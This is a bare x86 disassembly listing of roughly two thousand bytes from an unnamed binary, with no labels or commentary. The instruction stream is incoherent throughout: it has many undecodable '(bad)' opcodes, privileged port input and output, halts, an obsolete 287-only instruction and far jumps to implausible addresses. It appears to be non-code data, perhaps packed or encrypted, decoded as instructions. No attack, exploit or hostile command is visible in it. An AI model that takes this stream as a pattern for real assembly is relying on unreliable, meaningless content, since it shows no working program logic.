  414ef3:	sti    
  414ef4:	dec    esp
  414ef5:	xor    ebp,DWORD PTR [ebp-0x5b8c43ee]
  414efb:	and    eax,0x8ca588b6
  414f00:	push   ss
  414f01:	mov    bh,0xed
  414f03:	mov    cl,BYTE PTR [edx-0x47014d9]
  414f09:	fsubr  DWORD PTR [eax+0x38b964d3]
  414f0f:	jl     0x414f7e
  414f11:	push   esp
  414f12:	sbb    edi,DWORD PTR [ebx+0xbdb82ac]
  414f18:	sbb    eax,0xea46d62d
  414f1d:	sahf   
  414f1e:	std    
  414f1f:	leave  
  414f20:	jecxz  0x414f60
  414f22:	and    DWORD PTR [edi+esi*2-0x28],edi
  414f26:	sar    BYTE PTR [eax+0x67025fe7],cl
  414f2c:	cdq    
  414f2d:	mov    cl,0x83
  414f2f:	aaa    
  414f30:	cli    
  414f31:	mov    ch,0xb2
  414f33:	sub    eax,0x23b34ef0
  414f38:	mov    dh,bl
  414f3a:	or     ebx,edi
  414f3c:	jne    0x414f83
  414f3e:	repz jo 0x414f1b
  414f41:	cmp    dh,BYTE PTR [ebp-0x3c]
  414f44:	cdq    
  414f45:	frstpm(287 only) 
  414f47:	cmp    BYTE PTR [edi],dh
  414f49:	pop    ebx
  414f4a:	mov    ebx,0xe7fda315
  414f4f:	mov    ebx,0x6267bbe1
  414f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f55:	pop    edx
  414f56:	das    
  414f57:	pop    esp
  414f58:	mov    WORD PTR [edx],cs
  414f5a:	ds mov ecx,0x269646
  414f60:	inc    edi
  414f61:	pop    ecx
  414f62:	push   0xffffff8b
  414f64:	add    ebp,DWORD PTR ds:0xfa9e0d1a
  414f6a:	pop    eax
  414f6b:	or     ah,BYTE PTR fs:[esi-0x39400963]
  414f72:	inc    eax
  414f73:	out    0x96,al
  414f75:	mov    ebp,DWORD PTR [esi]
  414f77:	mov    dl,0xeb
  414f79:	repnz adc DWORD PTR [ebx+ecx*8+0x63],esp
  414f7e:	or     eax,DWORD PTR ds:[esi+0x26]
  414f82:	cmp    BYTE PTR [esi+eax*8-0x5f],dh
  414f86:	or     ebx,DWORD PTR [eax+0x1d]
  414f89:	out    dx,al
  414f8a:	sbb    dh,al
  414f8c:	jno    0x414ff7
  414f8e:	leave  
  414f8f:	in     al,0x57
  414f91:	out    0x7f,al
  414f93:	pop    edx
  414f94:	cmp    BYTE PTR [edx+0x68],dl
  414f97:	scas   eax,DWORD PTR es:[edi]
  414f98:	mov    esi,0x2435f886
  414f9d:	jo     0x414f96
  414f9f:	sub    ebp,DWORD PTR [ecx-0x25]
  414fa2:	lods   al,BYTE PTR ds:[esi]
  414fa3:	pop    ebx
  414fa4:	mov    ecx,?
  414fa6:	dec    ebx
  414fa7:	mov    bl,0x86
  414fa9:	lea    edx,cs:[edi-0x2869f581]
  414fb0:	in     al,dx
  414fb1:	add    BYTE PTR [eax+0xe],bl
  414fb4:	pop    esi
  414fb5:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  414fb7:	cmp    esp,DWORD PTR [edi]
  414fb9:	mov    esp,0xbbc5bdbd
  414fbe:	bound  ebx,QWORD PTR [eax]
  414fc0:	xchg   ecx,eax
  414fc1:	jge    0x414f56
  414fc3:	mov    DWORD PTR [edx-0xf6487a3],ecx
  414fc9:	sub    eax,0x73d47028
  414fce:	lods   eax,DWORD PTR ds:[esi]
  414fcf:	in     al,0x7b
  414fd1:	mov    al,ds:0xe19ca443
  414fd6:	les    eax,FWORD PTR ds:0x77f4cf4e
  414fdc:	dec    ecx
  414fdd:	pop    edi
  414fde:	xchg   edx,eax
  414fdf:	mov    BYTE PTR [edx],0x78
  414fe2:	jmp    FWORD PTR [ecx]
  414fe4:	xchg   esp,eax
  414fe5:	in     al,dx
  414fe6:	retf   0x1081
  414fe9:	ds (bad) 
  414fec:	pop    ecx
  414fed:	ds pop ebx
  414fef:	push   es
  414ff0:	f2xm1  
  414ff2:	out    0xd2,eax
  414ff4:	dec    ecx
  414ff5:	sbb    ebx,eax
  414ff7:	fisubr DWORD PTR [edx]
  414ff9:	adc    ebx,0x34ecaee7
  414fff:	leave  
  415000:	or     esp,0x9cc4a3ae
  415006:	push   ebx
  415007:	pop    ecx
  415008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415009:	pop    ds
  41500a:	das    
  41500b:	dec    ebp
  41500c:	xor    ebp,edx
  41500e:	mov    esi,0xedb1d027
  415013:	retf   
  415014:	push   ss
  415015:	xchg   ecx,eax
  415016:	jbe    0x414fe8
  415018:	ret    
  415019:	dec    esi
  41501a:	jno    0x414fe5
  41501c:	and    BYTE PTR [ecx-0x4a560aa8],dh
  415022:	int3   
  415023:	pop    es
  415024:	out    0xb9,eax
  415026:	fidiv  WORD PTR [edx]
  415028:	and    ah,BYTE PTR [edx-0x37]
  41502b:	inc    esi
  41502c:	xchg   edx,eax
  41502d:	call   0x39564128
  415032:	daa    
  415033:	mov    ch,0x8
  415035:	xchg   esi,eax
  415036:	hlt    
  415037:	js     0x41507f
  415039:	movzx  eax,BYTE PTR [eax+0xb5e4872]
  415040:	jg     0x414fc3
  415042:	adc    eax,0xebdfb6cf
  415047:	adc    BYTE PTR [eax+0x3d],bh
  41504a:	jb     0x41505d
  41504c:	icebp  
  41504d:	cmp    eax,0x55277b64
  415052:	lods   al,BYTE PTR ds:[esi]
  415053:	mov    ds:0x90d751f9,al
  415058:	sub    edx,edi
  41505a:	rcl    dl,1
  41505c:	paddd  mm7,QWORD PTR [eax]
  41505f:	hlt    
  415060:	call   0x82897503
  415065:	mov    es,WORD PTR [edx+0x55]
  415068:	mov    ds:0x51b21255,al
  41506d:	dec    ebx
  41506e:	jmp    0x415090
  415070:	cdq    
  415071:	int    0xb0
  415073:	and    BYTE PTR ds:0xf7f61961,0x29
  41507a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41507b:	xchg   cl,ch
  41507d:	cld    
  41507e:	adc    cx,WORD PTR cs:[edx-0x64]
  415083:	cld    
  415084:	shl    BYTE PTR [edi],cl
  415086:	xchg   ebx,eax
  415087:	sub    ch,dh
  415089:	daa    
  41508a:	mov    fs,WORD PTR [esi+0x17]
  41508d:	test   DWORD PTR [eax-0x29],eax
  415090:	sub    al,0x42
  415092:	xchg   esi,eax
  415093:	sub    dh,BYTE PTR [edx-0x6fdff1f4]
  415099:	fwait
  41509a:	mov    ds:0x532cf6e6,al
  41509f:	jp     0x4150dd
  4150a1:	pop    es
  4150a2:	pop    ecx
  4150a3:	(bad)
  4150a7:	adc    al,0xb3
  4150a9:	adc    DWORD PTR [ebx+0x7d],ebp
  4150ac:	mov    al,0xaa
  4150ae:	jp     0x415104
  4150b0:	ret    
  4150b1:	mov    ah,0x1
  4150b3:	or     al,0x6f
  4150b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150b6:	mov    esp,0xad9dae72
  4150bb:	sub    al,0x89
  4150bd:	jge    0x4150c5
  4150bf:	add    ecx,ecx
  4150c1:	inc    edx
  4150c2:	jge    0x415054
  4150c4:	(bad)  
  4150c5:	shl    DWORD PTR [edi-0x80],cl
  4150c8:	call   0x8855f49d
  4150cd:	ret    
  4150ce:	sbb    BYTE PTR [ecx+ebx*8],al
  4150d1:	cdq    
  4150d2:	fs retf 
  4150d4:	jbe    0x415093
  4150d6:	sbb    DWORD PTR [edx],esi
  4150d8:	mov    bl,0xf4
  4150da:	inc    edi
  4150db:	ss sbb al,0x8a
  4150de:	repz jl 0x415081
  4150e1:	ret    
  4150e2:	jb     0x4150b4
  4150e4:	push   ebx
  4150e5:	mov    esi,0xb96982d2
  4150ea:	iret   
  4150eb:	xchg   BYTE PTR [edi-0x1a],dh
  4150ee:	iret   
  4150ef:	adc    bh,0xa7
  4150f2:	cmp    edi,esi
  4150f4:	push   ecx
  4150f5:	sub    al,0x5
  4150f7:	cmp    bh,0xdd
  4150fa:	jae    0x415140
  4150fc:	mov    bh,0x50
  4150fe:	push   eax
  4150ff:	pop    edx
  415100:	sbb    ecx,DWORD PTR [eax+0x1b831619]
  415106:	aas    
  415107:	dec    edx
  415108:	clc    
  415109:	sbb    al,0x6c
  41510b:	ins    DWORD PTR es:[edi],dx
  41510c:	push   ebx
  41510d:	jp     0x4150b6
  41510f:	inc    esi
  415110:	aad    0x3b
  415112:	imul   edx,DWORD PTR [eax],0xc56adcad
  415118:	xor    al,0x59
  41511a:	cmp    BYTE PTR ds:0x6b4d9a1c,0x58
  415121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415122:	adc    esp,DWORD PTR [ecx]
  415124:	push   cs
  415125:	jmp    0xcb73ff0b
  41512a:	push   0x45
  41512c:	shl    ebx,1
  41512e:	xor    DWORD PTR [esi+0x2f],0x5ac0f1c1
  415135:	add    al,0xf1
  415137:	out    dx,eax
  415138:	jno    0x4150fc
  41513a:	stc    
  41513b:	popa   
  41513c:	popf   
  41513d:	add    eax,DWORD PTR [ecx+0xa]
  415140:	jnp    0x415103
  415142:	mov    DWORD PTR [edx+0x3c],ebx
  415145:	js     0x415197
  415147:	push   ebp
  415148:	stos   DWORD PTR es:[edi],eax
  415149:	push   edi
  41514a:	adc    BYTE PTR [ecx],al
  41514c:	xor    eax,ecx
  41514e:	or     eax,0xedf6aa1e
  415153:	cmp    al,0xdb
  415155:	pop    es
  415156:	pop    ss
  415157:	jmp    0xd7682fcf
  41515c:	mov    WORD PTR [eax+0x4e406d3f],ss
  415162:	or     al,0x49
  415164:	xchg   esi,eax
  415165:	adc    DWORD PTR ds:0xc297d74b,esp
  41516b:	xor    al,0x65
  41516d:	pop    es
  41516e:	bound  ebx,QWORD PTR [ecx-0x3b]
  415171:	stc    
  415172:	ins    DWORD PTR es:[edi],dx
  415173:	sti    
  415174:	adc    eax,0x58df3163
  415179:	data16 arpl WORD PTR [edx],di
  41517c:	sub    ecx,DWORD PTR [ebx-0x36]
  41517f:	ss pop eax
  415181:	xchg   BYTE PTR [ebx-0x37],ah
  415184:	inc    ebx
  415185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415186:	aam    0xda
  415188:	mov    ebx,0x87a3ca24
  41518d:	mov    edi,DWORD PTR [edi]
  41518f:	cmp    edi,DWORD PTR [esi]
  415191:	jns    0x415150
  415193:	jbe    0x4151e2
  415195:	jmp    0x41519c
  415197:	addr16 (bad) 
  415199:	loope  0x41513b
  41519b:	inc    edx
  41519c:	scas   eax,DWORD PTR es:[edi]
  41519d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41519e:	xor    bh,BYTE PTR [ecx-0x6f]
  4151a1:	mov    dl,0x7c
  4151a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a4:	stos   BYTE PTR es:[edi],al
  4151a5:	stc    
  4151a6:	cs inc ebp
  4151a8:	and    al,0x16
  4151aa:	adc    DWORD PTR [ebp+0x72],0xffffffe3
  4151ae:	out    0x21,al
  4151b0:	inc    edi
  4151b1:	push   ds
  4151b2:	repnz add DWORD PTR [edi+0x5e8a42c8],ecx
  4151b9:	leave  
  4151ba:	clc    
  4151bb:	inc    edi
  4151bc:	js     0x415162
  4151be:	sbb    BYTE PTR [ecx+0x63859ce5],cl
  4151c4:	or     eax,0xdec733a4
  4151c9:	mov    ah,0xcd
  4151cb:	ds sbb eax,0x49191bc7
  4151d1:	push   ebp
  4151d2:	push   ecx
  4151d3:	int3   
  4151d4:	dec    ebx
  4151d5:	scas   al,BYTE PTR es:[edi]
  4151d6:	cdq    
  4151d7:	xor    esp,DWORD PTR [eax-0x74a6e9cf]
  4151dd:	push   eax
  4151de:	xor    eax,0xdd69fe23
  4151e3:	sbb    bh,bh
  4151e5:	ret    0xd69d
  4151e8:	and    BYTE PTR [ebx-0x6b8a330f],dh
  4151ee:	ret    0xe9e7
  4151f1:	call   0x9eeb:0xa91fc0c3
  4151f8:	ret    0x38da
  4151fb:	lea    ebx,[ecx]
  4151fd:	sub    bh,BYTE PTR [ebp-0x2b]
  415200:	xchg   esp,eax
  415201:	dec    esp
  415202:	aaa    
  415203:	lahf   
  415204:	push   es
  415205:	(bad)
  41520a:	mov    ds:0xc0a021b4,al
  41520f:	nop
  415210:	jg     0x415254
  415212:	xchg   edi,eax
  415213:	sar    BYTE PTR [ebp-0x2940a373],0xb1
  41521a:	xor    esp,DWORD PTR [eax+0x7350c03c]
  415220:	retf   
  415221:	cs jp  0x4151c7
  415224:	sub    ebp,DWORD PTR [eax]
  415226:	stos   DWORD PTR es:[edi],eax
  415227:	loop   0x41524c
  415229:	sub    DWORD PTR [eax],esp
  41522b:	mov    ah,0xa6
  41522d:	sti    
  41522e:	sub    eax,0xc39eec48
  415233:	div    BYTE PTR [esi]
  415235:	push   ds
  415236:	add    dh,BYTE PTR ds:0xd0fe
  41523b:	test   al,0x45
  41523d:	and    DWORD PTR [ebx],edx
  41523f:	mov    dl,0x86
  415241:	lahf   
  415242:	jecxz  0x4152b3
  415244:	xor    edx,DWORD PTR [ebp+0x3f523596]
  41524a:	loope  0x4152b3
  41524c:	mov    ecx,0x49eee292
  415251:	dec    ebx
  415252:	dec    eax
  415253:	mov    edx,0x149af205
  415258:	inc    edi
  415259:	nop
  41525a:	std    
  41525b:	clc    
  41525c:	cdq    
  41525d:	jae    0x4152a7
  41525f:	retf   0x8504
  415262:	pusha  
  415263:	js     0x4152be
  415265:	cmc    
  415266:	mov    eax,ds:0x1de0248d
  41526b:	sbb    al,0xec
  41526d:	(bad)  
  41526e:	neg    BYTE PTR [edi]
  415270:	push   ds
  415271:	frstor [ecx]
  415273:	xchg   DWORD PTR [ebx],edx
  415275:	mov    bh,cl
  415277:	jmp    0x4152df
  415279:	scas   al,BYTE PTR es:[edi]
  41527a:	xor    DWORD PTR [esi-0xf35a4ad],edx
  415280:	mov    ecx,0x17dd634
  415285:	push   0x69
  415287:	shl    BYTE PTR [ebx+0x53],0xae
  41528b:	or     al,0xa
  41528d:	add    ebx,DWORD PTR [ebp+0x0]
  415290:	scas   al,BYTE PTR es:[edi]
  415291:	inc    eax
  415292:	push   es
  415293:	clc    
  415294:	dec    ecx
  415295:	inc    ebx
  415296:	shr    DWORD PTR [esi+0x6ad415c9],0x4e
  41529d:	push   ds
  41529e:	inc    esi
  41529f:	inc    edi
  4152a0:	es gs aaa 
  4152a3:	aaa    
  4152a4:	sbb    eax,edi
  4152a6:	mov    eax,ds:0xb55c5b24
  4152ab:	mov    ebp,0x5ddd80d7
  4152b0:	clc    
  4152b1:	dec    ebx
  4152b2:	push   esp
  4152b3:	pushf  
  4152b4:	xor    DWORD PTR [edi],ecx
  4152b6:	in     eax,dx
  4152b7:	sub    bh,BYTE PTR gs:[edi+ebp*8+0x1e774e7e]
  4152bf:	out    0x42,al
  4152c1:	cmp    al,BYTE PTR [eax+0x31060989]
  4152c7:	jo     0x4152c5
  4152c9:	pop    edx
  4152ca:	or     eax,0x39110717
  4152cf:	xchg   esi,eax
  4152d0:	hlt    
  4152d1:	or     ebx,DWORD PTR [edi+0x420fe784]
  4152d7:	jp     0x4152e5
  4152d9:	adc    DWORD PTR [edi],edi
  4152db:	(bad)  
  4152dd:	pusha  
  4152de:	fimul  DWORD PTR [edi+edi*8]
  4152e1:	mov    edx,0x4ee1c69e
  4152e6:	jnp    0x41526d
  4152e8:	push   edi
  4152e9:	loop   0x41534b
  4152eb:	mul    BYTE PTR [ebp-0x4988add1]
  4152f1:	in     al,dx
  4152f2:	mov    dh,0xad
  4152f4:	cmp    DWORD PTR [esi+eiz*2],eax
  4152f7:	iret   
  4152f8:	xor    DWORD PTR [ebx-0x5d],esi
  4152fb:	xor    eax,DWORD PTR [esi-0x4bee8b2e]
  415301:	mov    ch,0xbf
  415303:	jno    0x4152d1
  415305:	ret    0x3811
  415308:	cmp    eax,0x1b6a6d03
  41530d:	push   esi
  41530e:	fs mov ecx,0x21fd5c8d
  415314:	inc    esi
  415315:	mov    ds,WORD PTR [eax-0x1662332c]
  41531b:	stos   DWORD PTR es:[edi],eax
  41531c:	mov    ah,0x70
  41531e:	rol    ah,0x42
  415321:	pusha  
  415322:	xlat   BYTE PTR ds:[ebx]
  415323:	xor    esp,eax
  415325:	jge    0x415303
  415327:	daa    
  415328:	push   0x36
  41532a:	push   esi
  41532b:	pop    ss
  41532c:	and    BYTE PTR [eax],bh
  41532e:	mov    ah,0xe9
  415330:	or     BYTE PTR [edx+ebx*8-0x53],ch
  415334:	dec    esp
  415335:	fdivr  DWORD PTR [esi]
  415337:	fiadd  WORD PTR ds:0xe5e99621
  41533d:	mov    ds:0xf0c577e5,eax
  415342:	and    BYTE PTR [edx+0x51],dl
  415345:	cmp    DWORD PTR [edx-0x6f],ecx
  415348:	dec    edx
  415349:	or     BYTE PTR [edi],dh
  41534b:	xor    al,0xc3
  41534d:	cld    
  41534e:	aaa    
  41534f:	mov    bh,0x24
  415351:	adc    eax,0x71eb23e0
  415356:	mov    ecx,0x9624afda
  41535b:	xchg   DWORD PTR [ecx-0x6e],ebp
  41535e:	cdq    
  41535f:	cmc    
  415360:	sub    esi,DWORD PTR [edx-0x578a3018]
  415366:	(bad)  
  415368:	cmp    DWORD PTR [eax+0x13],edi
  41536b:	push   ecx
  41536c:	lds    edx,FWORD PTR [ebp+0x4]
  41536f:	mov    eax,?
  415371:	and    eax,0xfbfeec0
  415376:	int    0x36
  415378:	ret    0xf1d8
  41537b:	out    dx,eax
  41537c:	xchg   edi,eax
  41537d:	and    DWORD PTR ds:0xb708cf2,0xffffffb0
  415384:	call   0x589634e8
  415389:	jge    0x415322
  41538b:	out    0x8e,eax
  41538d:	sti    
  41538e:	dec    ecx
  41538f:	in     al,0x4d
  415391:	lods   al,BYTE PTR ds:[esi]
  415392:	fadd   DWORD PTR [eax-0x12]
  415395:	loope  0x415328
  415397:	xchg   esi,eax
  415398:	mov    eax,ds:0x89f935af
  41539d:	push   edi
  41539e:	int    0x19
  4153a0:	jbe    0x415412
  4153a2:	fdiv   st,st(3)
  4153a4:	mov    cl,0xd1
  4153a6:	mov    esp,0xe5de05c
  4153ab:	inc    ecx
  4153ac:	mov    WORD PTR [ecx+0x6179f953],es
  4153b2:	mov    DWORD PTR [ecx],ebp
  4153b4:	test   eax,0x3ac5c8fb
  4153b9:	sub    ecx,esi
  4153bb:	cmp    esi,DWORD PTR [ebx-0x1a]
  4153be:	xchg   ebp,eax
  4153bf:	test   al,0xb7
  4153c1:	fadd   QWORD PTR [edi]
  4153c3:	push   ecx
  4153c4:	mov    dl,BYTE PTR [ebp-0x605ad7ea]
  4153ca:	clc    
  4153cb:	jnp    0x4153b7
  4153cd:	dec    ecx
  4153ce:	mov    ecx,0xf620f01b
  4153d3:	jl     0x4153d8
  4153d5:	shl    DWORD PTR [edx-0x44576f7e],1
  4153db:	dec    ebx
  4153dc:	mov    esp,0x20896894
  4153e1:	push   esi
  4153e2:	scas   eax,DWORD PTR es:[edi]
  4153e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153e4:	xor    DWORD PTR [ebp-0x61f8b6f9],ebp
  4153ea:	ins    BYTE PTR es:[edi],dx
  4153eb:	pop    ecx
  4153ec:	jl     0x4153ae
  4153ee:	xchg   esp,eax
  4153ef:	dec    ebx
  4153f0:	leave  
  4153f1:	std    
  4153f2:	fcom   DWORD PTR [eax]
  4153f4:	out    dx,eax
  4153f5:	and    BYTE PTR [edx-0x959aed3],dl
  4153fb:	cwde   
  4153fc:	cmc    
  4153fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153fe:	adc    eax,0x36151ae4
  415403:	retf   0x61bd
  415406:	add    eax,0x8a8ebe45
  41540b:	(bad)  
  41540c:	cli    
  41540d:	mov    ah,dh
  41540f:	in     eax,0x49
  415411:	sbb    bl,BYTE PTR [edx]
  415413:	or     DWORD PTR [ebp-0x4826f5a0],ebx
  415419:	in     al,0xa2
  41541b:	in     eax,0x11
  41541d:	and    ch,BYTE PTR [edx+ecx*1]
  415420:	jecxz  0x415403
  415422:	clc    
  415423:	pop    ebp
  415424:	sub    eax,0xb4178582
  415429:	dec    ebx
  41542a:	shr    BYTE PTR ds:0xdbe9fe0e,1
  415430:	or     dh,cl
  415432:	sbb    eax,0x645f2362
  415437:	pop    ebx
  415438:	fistp  DWORD PTR [ecx]
  41543a:	push   edi
  41543b:	or     DWORD PTR [ebx-0x6bcce7b9],ebp
  415441:	aam    0xd4
  415443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415444:	push   es
  415445:	xchg   ebp,eax
  415446:	mov    al,ds:0x5d00dca0
  41544b:	mov    al,ds:0xcd10f575
  415450:	(bad)  [edi+0x27]
  415453:	fwait
  415454:	adc    BYTE PTR [ecx-0x42],ah
  415457:	call   0x98bd1d0d
  41545c:	dec    eax
  41545d:	retf   0x9840
  415460:	mov    bl,0x18
  415462:	sar    DWORD PTR [edx],0x37
  415465:	jo     0x415413
  415467:	mov    al,ds:0xb9a3bf28
  41546c:	int    0xbb
  41546e:	inc    ecx
  41546f:	out    0x35,eax
  415471:	retf   
  415472:	push   esp
  415473:	mov    dh,BYTE PTR [esi]
  415475:	mov    bl,al
  415477:	mov    dh,0x59
  415479:	pop    edi
  41547a:	ins    DWORD PTR es:[edi],dx
  41547b:	add    eax,0x528c6c56
  415480:	adc    edx,ecx
  415482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415483:	rcr    esi,1
  415485:	and    edi,ebx
  415487:	cwde   
  415488:	dec    edi
  415489:	xchg   edx,eax
  41548a:	inc    ecx
  41548b:	in     eax,0xf5
  41548d:	lock loope 0x4154aa
  415490:	sbb    esp,DWORD PTR ds:0x596ccc8d
  415496:	xor    DWORD PTR [esi+0x8],ebp
  415499:	arpl   WORD PTR [ecx+0x22],bp
  41549c:	div    DWORD PTR [edi]
  41549e:	pop    esp
  41549f:	dec    ecx
  4154a0:	mov    al,0x75
  4154a3:	mov    al,ds:0x30278997
  4154a8:	mov    edi,0xfbfb13c6
  4154ad:	ss out 0x95,al
  4154b0:	push   ecx
  4154b1:	mov    DWORD PTR [eax-0x3b8448b],esi
  4154b7:	(bad)  
  4154b8:	mov    eax,0xdddc2d9
  4154bd:	aaa    
  4154be:	ret    
  4154bf:	or     edx,edi
  4154c1:	add    esi,DWORD PTR [ebp+0x60096d82]
  4154c7:	xor    ebp,DWORD PTR [edx+0x47fd458a]
  4154cd:	mov    cl,dl
  4154cf:	fsubr  DWORD PTR [eax-0x7a]
  4154d2:	fwait
  4154d3:	mov    eax,0xdf9f98d5
  4154d8:	loop   0x4154ec
  4154da:	push   ds
  4154db:	and    eax,0xa9fb699f
  4154e0:	jmp    0x415487
  4154e2:	inc    edx
  4154e3:	jmp    0xf306:0xd3cfca85
  4154ea:	nop
  4154eb:	je     0x4154a7
  4154ed:	cmp    DWORD PTR [esi],ebp
  4154ef:	xor    al,0x55
  4154f1:	xchg   ecx,eax
  4154f2:	push   0x3a
  4154f4:	cmp    BYTE PTR ds:0x1e568933,0x73
  4154fb:	jno    0x4154e0
  4154fd:	leave  
  4154fe:	gs jne 0x415535
  415501:	sti    
  415502:	cmp    al,0x80
  415504:	call   0x9528:0x4ea299c3
  41550b:	jge    0x4154b8
  41550d:	push   edi
  41550e:	add    ebp,ebx
  415510:	mov    dh,0x2a
  415512:	jecxz  0x41558c
  415514:	or     eax,0x91f8f82e
  415519:	adc    BYTE PTR [edi-0x21477be8],dl
  41551f:	mov    bl,0xe2
  415521:	pop    ss
  415522:	dec    ebx
  415523:	loopne 0x4154f2
  415525:	out    0x6f,eax
  415527:	imul   edx,DWORD PTR [edi-0x65a6f67c],0x59
  41552e:	cli    
  41552f:	into   
  415530:	mov    bl,0xe9
  415532:	jne    0x415596
  415534:	xchg   DWORD PTR [ebx+edx*1+0x74d43f37],esi
  41553b:	jae    0x4155b3
  41553d:	lods   eax,DWORD PTR ds:[esi]
  41553e:	mov    bl,0xa
  415540:	aam    0x6a
  415542:	retf   0x372e
  415545:	push   edx
  415546:	nop
  415547:	jl     0x415520
  415549:	and    al,0x45
  41554b:	(bad)  
  41554c:	adc    al,0x34
  41554e:	scas   al,BYTE PTR es:[edi]
  41554f:	fisubr DWORD PTR ds:0xa2d61f22
  415555:	pop    eax
  415556:	les    edx,FWORD PTR [ebx-0x6f]
  415559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41555a:	lods   al,BYTE PTR ds:[esi]
  41555b:	push   edi
  41555c:	push   0x10db9465
  415561:	cld    
  415562:	inc    ebx
  415563:	jge    0x415570
  415565:	sbb    BYTE PTR es:[ecx+0x73],ah
  415569:	fst    QWORD PTR [ecx]
  41556b:	pushf  
  41556c:	dec    esi
  41556d:	push   esi
  41556e:	test   esp,esi
  415570:	adc    al,0x2f
  415572:	cld    
  415573:	pop    ebp
  415574:	es fs dec edx
  415577:	cmp    ch,ah
  415579:	push   esi
  41557a:	add    BYTE PTR [esi+eiz*1],cl
  41557d:	mov    ebx,0xafc7322b
  415582:	(bad)  
  415583:	sbb    BYTE PTR [esi],dl
  415585:	ds xchg esp,eax
  415587:	push   edi
  415588:	outs   dx,DWORD PTR ds:[esi]
  415589:	mov    edi,0xd4ca8fac
  41558e:	into   
  41558f:	pop    edi
  415590:	hlt    
  415591:	sbb    bl,BYTE PTR [ecx+ebx*8+0x72]
  415595:	add    dl,dl
  415597:	lahf   
  415598:	pop    esp
  415599:	cmp    cl,BYTE PTR [edi+0x6d]
  41559c:	add    bl,dh
  41559e:	stos   DWORD PTR es:[edi],eax
  41559f:	mov    esp,0x2d7d4db3
  4155a4:	lods   al,BYTE PTR ds:[esi]
  4155a5:	sar    DWORD PTR [edi+0x7b7d5f6b],0x55
  4155ac:	mov    bl,0xc1
  4155ae:	data16 je 0x41553d
  4155b1:	xor    eax,0x2d3f19ba
  4155b6:	sbb    eax,0xcc5e2646
  4155bb:	js     0x415623
  4155bd:	pop    ds
  4155be:	push   ebx
  4155bf:	jp     0x415591
  4155c1:	out    dx,eax
  4155c2:	xchg   ebx,eax
  4155c3:	mov    DWORD PTR [esi+0xacb1ea],esp
  4155c9:	mov    ah,0x79
  4155cb:	push   edi
  4155cc:	xchg   BYTE PTR [ebp-0x5f],ch
  4155cf:	or     esi,DWORD PTR [edi-0x23]
  4155d2:	push   0xe8a7d6d6
  4155d7:	push   edx
  4155d8:	aaa    
  4155d9:	out    0xf9,al
  4155db:	mov    BYTE PTR [edx-0x40c0633d],ah
  4155e1:	push   0xaabc6004
  4155e6:	js     0x415594
  4155e8:	push   edi
  4155e9:	int    0x34
  4155eb:	pop    edi
  4155ec:	enter  0xe130,0x8
  4155f0:	ds pop ds
  4155f2:	mov    ebp,edx
  4155f4:	mov    ebx,0xc2fa1af4
  4155f9:	lock and edi,DWORD PTR [eax-0x47]
  4155fd:	sar    BYTE PTR [edi],1
  4155ff:	addr16 (bad) 
  415601:	in     eax,dx
  415602:	jl     0x41560a
  415604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415605:	lods   eax,DWORD PTR ds:[esi]
  415606:	mov    DWORD PTR [edx+0x46],ebx
  415609:	ins    BYTE PTR es:[edi],dx
  41560a:	jne    0x415597
  41560c:	xchg   ecx,eax
  41560d:	jp     0x4155f3
  41560f:	mov    eax,ds:0xb5bae9d9
  415614:	ret    0xb2f5
  415617:	lahf   
  415618:	mov    dh,0x56
  41561a:	sbb    BYTE PTR [eax+0x2c],bh
  41561d:	adc    ebp,DWORD PTR [eax+0x7ecee7cd]
  415623:	push   es
  415624:	bound  esp,QWORD PTR [esi+0x60]
  415627:	sbb    ebx,DWORD PTR [ebx]
  415629:	pop    ebx
  41562a:	cmp    edx,ebp
  41562c:	rol    dh,1
  41562e:	add    ah,ch
  415630:	enter  0x117b,0xac
  415634:	into   
  415635:	pop    esp
  415636:	jns    0x41563e
  415638:	xchg   ch,ch
  41563a:	push   eax
  41563b:	ss inc ecx
  41563d:	cmp    BYTE PTR [edi],0xcb
  415640:	push   0xffffff88
  415642:	xor    DWORD PTR [ebp-0x395f43bd],edi
  415648:	int3   
  415649:	ds ins BYTE PTR es:[edi],dx
  41564b:	sbb    eax,0xaed89e24
  415650:	mov    cl,0x5f
  415652:	sub    eax,0xc08c2173
  415657:	push   edx
  415658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415659:	out    dx,eax
  41565a:	and    eax,0xf5ca731a
  41565f:	(bad)  
  415660:	pop    edi
  415661:	loope  0x4155f9
  415663:	into   
  415664:	xchg   ecx,eax
  415665:	pop    ebp
  415666:	(bad)  
  415667:	fs jmp 0x8c98:0x982c14ce
  41566f:	ins    BYTE PTR es:[edi],dx
  415670:	xchg   edi,eax
  415671:	fwait
  415672:	sbb    eax,0x9051a53a
  415677:	das    
  415678:	sbb    BYTE PTR [ebx-0x13],bl
  41567b:	fild   DWORD PTR [esi]
  41567d:	(bad)  
  41567e:	(bad)  [ebx+0x76]
  415681:	cs aas 
  415683:	jb     0x415650
  415685:	stc    
  415686:	imul   eax,DWORD PTR [ecx],0xffffffe6
  415689:	xor    eax,0xa9aaeb5c
  41568e:	sbb    BYTE PTR [edi-0x4b93c848],bl
  415694:	jns    0x4156ac
  415696:	jo     0x4156fb
  415698:	sub    BYTE PTR [esi],ah
  41569a:	jg     0x41565b
  41569c:	cli    
  41569d:	aaa    
  41569e:	inc    ebp
  41569f:	out    dx,eax
  4156a0:	rcr    BYTE PTR [ebx-0x17],0x69
  4156a4:	in     al,0x34
  4156a6:	jnp    0x415634
  4156a8:	enter  0x1268,0x8a
  4156ac:	jne    0x41563c
  4156ae:	dec    edx
  4156af:	out    0x9c,al
  4156b1:	mov    eax,ds:0x1275e3fc
  4156b6:	clc    
